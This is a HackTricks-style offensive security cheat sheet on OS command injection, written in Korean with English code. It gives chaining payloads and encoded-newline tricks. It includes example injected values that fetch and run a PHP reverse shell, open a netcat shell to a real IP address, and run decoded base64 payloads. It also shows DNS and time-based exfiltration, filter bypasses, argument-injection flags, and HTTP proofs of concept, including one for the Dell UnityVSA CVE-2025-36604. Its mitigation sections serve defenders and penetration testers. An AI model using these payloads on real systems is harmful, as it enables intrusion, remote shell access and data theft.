# Command Injection

{{#include ../banners/hacktricks-training.md}}

## command Injection이란?

A **command injection**은 애플리케이션을 호스팅하는 서버에서 공격자가 임의의 운영 체제 명령을 실행할 수 있게 합니다. 그 결과, 애플리케이션과 그 모든 데이터가 완전히 손상될 수 있습니다. 이러한 명령의 실행은 일반적으로 공격자가 애플리케이션의 환경 및 기본 시스템에 대해 무단 접근이나 제어를 획득할 수 있게 합니다.

### 컨텍스트

입력이 **어디에 주입되는지**에 따라 명령을 실행하기 전에 **따옴표로 감싸진 컨텍스트를 종료**(예: `"` 또는 `'`)해야 할 수 있습니다.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Limition** 우회

만약 **linux 머신 내부에서 임의의 명령을 실행**하려는 경우, 이 **우회:**를 읽어보면 도움이 될 것입니다


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **예시**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### 파라미터

다음은 code injection 및 유사한 RCE vulnerabilities에 취약할 수 있는 상위 25개 파라미터입니다 (출처: [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

데이터 추출: 한 문자씩
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

다음 도구를 기반으로 함: `https://github.com/HoLyVieR/dnsbin` (dnsbin.zhack.ca에도 호스팅됨)
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
DNS 기반 data exfiltration을 확인하는 온라인 도구:

- dnsbin.zhack.ca
- pingb.in

### 필터링 우회

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

JavaScript/TypeScript 백엔드를 감사할 때 종종 Node.js의 `child_process` API를 마주하게 됩니다.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()`는 **shell** (`/bin/sh -c`)을 생성하므로, shell에 특별한 의미가 있는 모든 문자(back-ticks, `;`, `&&`, `|`, `$()`, …)가 문자열에 사용자 입력으로 연결될 때 **command injection**을 유발할 수 있습니다.

**완화:** `execFile()` (또는 `spawn()`를 `shell` 옵션 없이 사용)하고 **각 인수를 별도의 배열 요소로 제공**하여 shell이 개입하지 않도록 합니다:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794는 인증되지 않은 WebSocket 이벤트를 통해 공격자가 제어하는 데이터를 `id_user`에 넣을 수 있었고, 이 값이 나중에 `exec()` 호출에 임베드되어 RCE를 달성했습니다 (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

모든 injections가 shell 메타문자를 필요로 하는 것은 아닙니다. 애플리케이션이 신뢰할 수 없는 문자열을 시스템 유틸리티의 인수로 전달할 때(심지어 `execve`/`execFile`로 쉘 없이 실행해도), 많은 프로그램은 `-` 또는 `--`로 시작하는 인수를 옵션으로 해석합니다. 이는 공격자가 쉘로 진입하지 않고도 모드를 전환하거나 출력 경로를 변경하거나 위험한 동작을 유발할 수 있게 합니다.

일반적으로 이런 문제가 발생하는 위치:

- Embedded web UIs/CGI handlers가 `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>` 등과 같은 명령을 조립할 때
- 중앙집중형 CGI 라우터(예: `topicurl=<handler>` 같은 선택자 파라미터를 가진 `/cgi-bin/<something>.cgi`)에서 여러 핸들러가 같은 약한 검증기를 재사용할 때

시도해볼 것:

- 하위 도구가 플래그로 소비할 수 있도록 `-`/`--`로 시작하는 값을 제공해 보세요.
- 동작을 변경하거나 파일을 쓰는 플래그를 악용해 보세요. 예:
- `ping`: 장치를 과부하시킬 수 있는 `-f`/`-c 100000` (DoS)
- `curl`: 임의 경로에 쓸 수 있는 `-o /tmp/x`, 공격자 제어 config를 로드하는 `-K <url>`
- `tcpdump`: unsafe wrappers에서 포스트-로테이트 실행을 달성할 수 있는 `-G 1 -W 1 -z /path/script.sh`
- 프로그램이 `--` end-of-options를 지원하면, 잘못된 위치에 `--`를 선행시키는 순진한 완화책을 우회할 수 있는지 시도해 보세요.

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
## Brute-Force Detection List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}

## Perl backticks/qx// sinks in Apache mod_perl handlers (도달성 및 악용)

실제 패턴: Perl 코드가 셸 명령 문자열을 구성하고 backticks (또는 qx//)로 이를 실행합니다. mod_perl AccessHandler에서는 $r->uri() 같은 공격자 제어 요청 구성요소가 해당 문자열로 흘러갈 수 있습니다. 어떤 분기에서 원시 입력을 연결한 뒤 셸로 평가하면 pre-auth RCE가 발생합니다.

위험한 Perl 실행 원시(단일 문자열을 인수로 받을 때 셸을 생성함):
- Backticks / qx//: my $out = `cmd ...`;
- system을 단일 문자열로 호출: system("/bin/sh -c '...'") (암묵적 동작)
- 파이프로 open 호출: open my $fh, "cmd |" or "| cmd"
- IPC::Open3를 단일 문자열과 함께 호출

실제에서 관찰된 최소 취약 형태:
```perl
sub getCASURL {
...
my $exec_cmd = "...";
if ($type eq 'login') {
$exec_cmd .= $uri;        # $uri from $r->uri() → attacker-controlled
my $out = `$exec_cmd`;    # backticks = shell
}
}
```
mod_perl에서의 주요 도달성 고려사항:
- 핸들러 등록: httpd.conf가 요청을 Perl 모듈로 라우팅해야 합니다. 예: PerlModule MOD_SEC_EMC::AccessHandler 및 특정 path 범위에 대해 AccessHandler::handler를 호출하는 구성.
- 취약한 분기 유발: 인증되지 않은 로그인 흐름이 트리거되도록 하여 type == "login"이 되게 하세요 (예: 예상된 auth cookie를 생략).
- 해결 가능한 경로: 요청이 구성된 범위 내에서 해석되는 URI를 대상으로 하는지 확인하세요. Apache가 해당 요청을 핸들러로 라우팅하지 않으면 sink에 도달하지 않습니다.

Exploitation workflow
1) httpd.conf에서 PerlModule/MOD_PERL 핸들러 범위를 검사해 핸들러가 처리하는 해석 가능한 경로를 찾습니다.
2) 인증되지 않은 요청을 보내 로그인 리다이렉트 경로가 선택되도록 하세요 (type == "login").
3) 요청-URI 경로에 shell metacharacters를 삽입하여 $r->uri()가 페이로드를 명령 문자열로 전달하게 하세요.

예시 HTTP PoC (path injection via ';')
```http
GET /ui/health;id HTTP/1.1
Host: target
Connection: close
```
팁
- 구분자 시도: ;, &&, |, `backticks`, $(...), 그리고 인용 방식에 따라 인코딩된 줄바꿈(%0A).
- 이전 패치에서 다른 인자들은 인용하지만 한 분기에서 URI만 인용하지 않았다면, 문자열 끝에 페이로드를 붙이는 것이 종종 동작함: ;id# 또는 &&/usr/bin/id#

보안 강화 (Perl)
- 셸 문자열을 조립하지 마라. 인수 벡터 실행을 선호하라: system('/usr/bin/curl', '--silent', '--', $safe_url) — 셸을 호출하지 않음.
- 셸을 피할 수 없다면 모든 분기에서 엄격하고 일관되게 이스케이프하라; $r->uri()를 적대적 입력으로 취급하라. 경로/쿼리엔 URI::Escape를 고려하고 강력한 허용 목록을 사용하라.
- 명령 실행에 backticks/qx//를 사용하지 마라; 정말 필요하다면 셸을 호출하지 않는 open3/list 형태로 출력을 캡처하라.
- mod_perl 핸들러에서는 auth/redirect 코드 경로에서 명령 실행을 하지 않거나, 분기 간 동일한 정화(sanitization)를 보장해 “모든 곳에서 고쳤지만 한 분기만 고치지 않은” 회귀를 피하라.

취약점 탐색
- 셸 명령을 조합하는 모듈의 패치-차이를 살펴라; 분기 간 인용이 일관되지 않은 부분을 찾아라 (예: if ($type eq 'login')가 이스케이프되지 않은 경우).
- backticks, qx//, open\s*\(|\||, 그리고 system\s*\(\s*" 등을 grep 하여 문자열 기반 셸 사용을 찾아라. sink에서 요청 진입($r)으로의 호출 그래프를 구성해 pre-auth 도달 가능성을 검증하라.

실제 사례: Dell UnityVSA pre-auth RCE (CVE-2025-36604)
- type == "login"일 때 AccessTool.pm:getCASURL에서 backticks를 통해 raw $uri ($r->uri())가 연결되어 발생하는 pre-auth command injection.
- MOD_SEC_EMC::AccessHandler → make_return_address($r) → getCASLoginURL(..., type="login") → getCASURL(..., $uri, 'login')를 통해 도달 가능.
- 실무적 주의점: 핸들러가 처리하는 해결 가능한 경로를 사용하라; 그렇지 않으면 모듈이 실행되지 않아 sink에 도달하지 못함.

## References

- [It’s Never Simple Until It Is: Dell UnityVSA Pre‑Auth Command Injection (CVE‑2025‑36604)](https://labs.watchtowr.com/its-never-simple-until-it-is-dell-unityvsa-pre-auth-command-injection-cve-2025-36604/)
- [Dell PSIRT DSA‑2025‑281 – Security update for Dell Unity/UnityVSA/Unity XT](https://www.dell.com/support/kbdoc/en-uk/000350756/dsa-2025-281-security-update-for-dell-unity-dell-unityvsa-and-dell-unity-xt-security-update-for-multiple-vulnerabilities)
- [watchTowr Detection Artefact Generator – Dell UnityVSA Pre‑Auth CVE‑2025‑36604](https://github.com/watchtowrlabs/watchTowr-vs-Dell-UnityVSA-PreAuth-CVE-2025-36604)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../banners/hacktricks-training.md}}
